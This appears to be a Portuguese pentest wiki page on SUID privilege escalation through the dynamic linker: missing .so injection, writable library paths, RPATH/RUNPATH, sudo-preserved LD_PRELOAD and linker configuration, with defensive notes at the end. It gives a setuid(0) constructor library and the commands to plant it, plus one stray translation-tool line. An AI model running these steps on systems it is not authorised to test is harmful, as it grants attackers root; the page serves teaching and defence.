# Abuso de Bibliotecas Compartilhadas e do Linker SUID

{{#include ../../banners/hacktricks-training.md}}

Os binários SUID geralmente são analisados em busca de execução direta de comandos, mas programas SUID personalizados também podem ser vulneráveis por meio do linker dinâmico. O tema comum é simples: um executável privilegiado carrega código de um caminho ou de uma configuração que um usuário com menos privilégios pode influenciar.<sup>[[1]](#references)</sup>

Esta página se concentra em padrões genéricos de técnicas: bibliotecas ausentes, diretórios de bibliotecas com permissão de escrita, `RPATH`/`RUNPATH`, `LD_PRELOAD` por meio do sudo, configuração do linker e confusão com hardlinks SUID.

## Enumeração Rápida

Comece encontrando arquivos SUID incomuns e verificando se eles estão dinamicamente vinculados:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentre-se em localizações não padrão, caminhos de aplicações personalizadas, binários pertencentes ao root, mas localizados fora de diretórios gerenciados por pacotes, e dependências carregadas de diretórios com permissão de escrita.<sup>[[1]](#references)</sup>

Verificações úteis de permissão de escrita:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Alguns binários SUID personalizados tentam carregar um shared object que não existe. Se o caminho ausente estiver em um diretório controlado pelo atacante, o binário poderá carregar código fornecido pelo atacante como o usuário efetivo.<sup>[[1]](#references)</sup>

Encontre consultas de biblioteca malsucedidas com o filtro de syscalls do `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Se o binário procurar `libexample.so` em um caminho gravável, uma biblioteca mínima de prova poderá usar um construtor. Mantenha a prova de impacto inofensiva durante a validação:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compile-o com o nome de arquivo exato que o binário tenta carregar:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
A condição explorável não é apenas a ausência da library. O atacante precisa conseguir colocar um shared object compatível em um caminho que o loader privilegiado aceitará.<sup>[[1]](#references)</sup>

## Diretório de Library Gravável

Às vezes, todas as dependências existem, mas um dos diretórios usados para resolvê-las permite escrita. Isso pode permitir substituir uma library carregada ou plantar uma library de prioridade mais alta com o mesmo nome.<sup>[[1]](#references)</sup>

Revise os caminhos das dependências:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Se o diretório tiver permissão de escrita, valide usando uma abordagem segura para cópia em um laboratório. Substituir bibliotecas do sistema em um host ativo pode deixar processos iniciados simultaneamente com versões de biblioteca inconsistentes.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` e `RUNPATH` são entradas da seção dinâmica que informam ao carregador onde procurar bibliotecas. Elas são perigosas em programas SUID quando apontam para diretórios graváveis pelo atacante.<sup>[[1]](#references)</sup>

Detecte-as:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Nenhum conteúdo foi fornecido para tradução.
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Se `/opt/app/lib` tiver permissão de escrita e o binário precisar de `libcustom.so`, o invasor poderá conseguir colocar uma `libcustom.so` maliciosa nesse diretório:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` e `RUNPATH` não são idênticos em todos os detalhes de resolução, mas, para a análise de privilege escalation, a questão prática é a mesma: o binário SUID procura o nome de uma library em um diretório gravável pelo atacante?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Para programas normais, `LD_PRELOAD` e `LD_LIBRARY_PATH` podem forçar ou influenciar o carregamento de shared objects. Para programas SUID, o dynamic loader normalmente entra no modo de execução segura e ignora variáveis de ambiente perigosas.<sup>[[1]](#references)</sup>

Isso significa que um binário SUID comum geralmente não é vulnerável apenas porque o usuário pode definir `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
A exceção comum é uma política do sudo que permite definir ou preservar variáveis do loader para o comando-alvo. Inspecione `sudo -l` em busca de entradas como `env_keep+=LD_PRELOAD` ou `env_keep+=LD_LIBRARY_PATH`; se o alvo estiver vinculado dinamicamente, ele poderá carregar código controlado pelo atacante:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Não confunda estes casos; o loader e as regras de política do sudo acima os distinguem:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` contra um binário SUID normal: geralmente bloqueado pela execução segura.
- `LD_PRELOAD` preservado pelo sudo: potencialmente explorável.
- `.so` ausente em um caminho gravável: explorável quando o binário SUID carrega naturalmente esse caminho.
- `RPATH`/`RUNPATH` apontando para um diretório gravável: explorável quando uma biblioteca necessária pode ser controlada.
- Acesso de escrita a `/etc/ld.so.preload` ou à configuração do linker: impacto em todo o sistema e alto impacto.

## Configuração do Linker

`ld.so` usa o cache do linker e `/etc/ld.so.preload`; `ldconfig` cria esse cache a partir de `/etc/ld.so.conf` e dos arquivos incluídos por ele, geralmente em `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Verificações de alto valor:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Uma configuração gravável do linker geralmente é mais grave do que um único binário SUID vulnerável, pois pode afetar muitos processos vinculados dinamicamente. `/etc/ld.so.preload` é especialmente perigoso porque pode forçar a inclusão de um shared object em processos privilegiados.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks podem fazer com que o mesmo inode SUID apareça com vários nomes.<sup>[[9]](#references)</sup> Isso é útil para ocultar um helper privilegiado, confundir a limpeza ou contornar uma revisão ingênua baseada em caminhos.

Encontre arquivos SUID com mais de um link:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspecione todos os caminhos para o mesmo inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
O abuso não consiste em uma hardlink alterar permissões. O abuso é a confusão de caminhos: um inode privilegiado pode ser acessado por meio de um nome que os defensores ou scripts não esperam.<sup>[[9]](#references)</sup> Para obter mais detalhes sobre o inode e o workflow de hardlinks, consulte [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Notas defensivas

- Mantenha os binários SUID mínimos, auditados e gerenciados por pacotes sempre que possível.
- Evite entradas `RPATH`/`RUNPATH` apontando para diretórios graváveis ou gerenciados pela aplicação.<sup>[[1]](#references)[[8]](#references)</sup>
- Mantenha os diretórios de bibliotecas pertencentes ao root e não graváveis por usuários comuns.<sup>[[8]](#references)</sup>
- Não preserve `LD_PRELOAD`, `LD_LIBRARY_PATH` ou variáveis semelhantes do loader através do sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Monitore `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e arquivos SUID inesperados.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Revise arquivos SUID com hardlinks e investigue wrappers SUID personalizados fora dos caminhos padrão do sistema.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — página de manual do Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (Utilitários Binários GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — página de manual do Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Atributos Comuns (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Hardening do Dynamic Linker (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (Utilitários Binários GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
